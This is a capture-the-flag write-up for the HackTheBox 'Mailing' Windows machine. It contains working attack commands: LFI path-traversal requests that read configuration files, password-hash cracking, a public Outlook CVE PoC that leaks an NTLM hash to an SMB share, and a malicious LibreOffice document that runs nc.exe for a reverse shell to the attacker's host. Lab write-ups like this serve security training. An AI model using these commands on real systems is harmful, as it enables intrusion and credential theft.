---
title: "Mailing"
date: 2025-06-20
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Mailing

![](../assets/Pasted%20image%2020250513182758.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.14   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 18:26 CEST
Nmap scan report for 10.10.11.14
Host is up (0.042s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: CHILDREN NAMESPACE SORT QUOTA OK completed CAPABILITY RIGHTS=texkA0001 IMAP4 IMAP4rev1 ACL IDLE
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: CHILDREN NAMESPACE SORT QUOTA OK completed CAPABILITY RIGHTS=texkA0001 IMAP4 IMAP4rev1 ACL IDLE
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50529/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-13T16:29:36
|_  start_date: N/A

TRACEROUTE (using port 25/tcp)
HOP RTT      ADDRESS
1   42.65 ms 10.10.14.1
2   42.82 ms 10.10.11.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.54 seconds
```

Add `mailing.htb` to `/etc/hosts` and navigate to the site.

![](../assets/Pasted%20image%2020250513190719.png)

The host has a mail service and uses `hMailServer` in the backend.

## Initial Access

Make a list with the three users and their roles.

```shell
$ cat users
ruy@mailing.htb
maya@mailing.htb
gregory@mailing.htb
it@mailing.htb
support@mailing.htb
```

Using `smtp-user-enum`, check if any user exists.

```shell
$ smtp-user-enum -M RCPT -U users -t 10.10.11.14 
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 5
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Tue May 13 22:27:57 2025 #########
10.10.11.14: support@mailing.htb exists
10.10.11.14: it@mailing.htb exists
10.10.11.14: gregory@mailing.htb exists
10.10.11.14: ruy@mailing.htb exists
10.10.11.14: maya@mailing.htb exists
######## Scan completed at Tue May 13 22:27:57 2025 #########
5 results.

5 queries in 1 seconds (5.0 queries / sec)
```

Three are valid but we need a password to send an email.

On the site, we notice the download URL is like `?file=asdf.pdf`, testing if it is an LFI.

```shell
$ curl "http://mailing.htb/download.php?file=..\..\..\..\..\..\windows\win.ini"         
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Searching in the `hMailServer` documentation, we learn that the config file is in `'Program Files (x86)\hMailServer\Bin\hMailServer.ini'`.

```shell
$ curl "http://mailing.htb/download.php?file=..\..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Bin\hMailServer.ini"
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

With `hashcat`, we recover one hash, the `AdministratorPassword` one.

```shell
$ hashcat -m 0 hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force
hashcat (v6.2.6) starting
...
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
```

Test the credential with `telnet` connecting to `pop3`.

```shell
$ telnet mailing.htb 110
Trying 10.10.11.14...
Connected to mailing.htb.
Escape character is '^]'.
+OK POP3
user administrator@mailing.htb
+OK Send your password
pass homenetworkingadministrator
+OK Mailbox locked and ready
```

Sending links and stuff with `sendEmail` doesn't get a response back, so searching for vulns we find [https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability).

```shell
$ python CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender it@mailing.htb --recipient maya@mailing.htb --subject hey --url \\10.10.14.10\asdf

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de                                                                                        

✅ Email sent successfully.
```

Start an `smbserver` and wait.

```shell
$ impacket-smbserver -smb2support kali .                          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.14,52689)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:b5e9b462d7629052775cf089f0fba24c:010100000000000000ff557c50c4db013b4a64b85414973800000000010010006300630059007800480046004b007000030010006300630059007800480046004b0070000200100074005100710042005a00530065004f000400100074005100710042005a00530065004f000700080000ff557c50c4db0106000400020000000800300030000000000000000000000000200000bc50cd0cf8b2ad384d021cf2793b2cd9efcd8d2aca8f52768b9e268f3f76b08f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310030000000000000000000
[*] Connecting Share(1:IPC$)
```

```shell
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force  
hashcat (v6.2.6) starting


MAYA::MAILING:aaaaaaaaaaaaaaaa:b5e9b462d7629052775cf089f0fba24c:010100000000000000ff557c50c4db013b4a64b85414973800000000010010006300630059007800480046004b007000030010006300630059007800480046004b0070000200100074005100710042005a00530065004f000400100074005100710042005a00530065004f000700080000ff557c50c4db0106000400020000000800300030000000000000000000000000200000bc50cd0cf8b2ad384d021cf2793b2cd9efcd8d2aca8f52768b9e268f3f76b08f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310030000000000000000000:m4y4ngs4ri
```

`maya:m4y4ngs4ri`

Checking with `nxc`, we can access via `winrm`.

![](../assets/Pasted%20image%2020250513235030.png)

```shell
$ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri            

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> whoami
mailing\maya
```

Get the flag

```shell
*Evil-WinRM* PS C:\Users\maya\desktop> type user.txt
2fa1a39d74f4299226bba00a57d36822
```

## Privilege Escalation

Transfer `winPEASany` and execute it.

We see some installed programs.

![](../assets/Pasted%20image%2020250514204619.png)

Reading the files, the version is `7.4`.

![](../assets/Pasted%20image%2020250514204926.png)

We find this exploit [https://github.com/elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255).

With this exploit, we can create a malicious file for a user to open.

```shell
$ python CVE-2023-2255.py --cmd "cmd.exe /c C:\users\public\nc.exe 10.10.14.12 5555 -e cmd" --output .\important.odt
File .important.odt has been created !
```

Upload `nc.exe` to the public folder.

```shell
*Evil-WinRM* PS C:\users\public> upload nc.exe
 
Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!
```

Now upload the exploit to `C:\Important Documents` and start the listener.

![](../assets/Pasted%20image%2020250514212755.png)

```shell
$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.14] 62878
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program>whoami
whoami
mailing\localadmin
```

## Post Exploitation

Get the flag

```shell
C:\Users\localadmin\Desktop>type root.txt
type root.txt
a7ffff38272fb5df4cce86e605bcfe5a
```
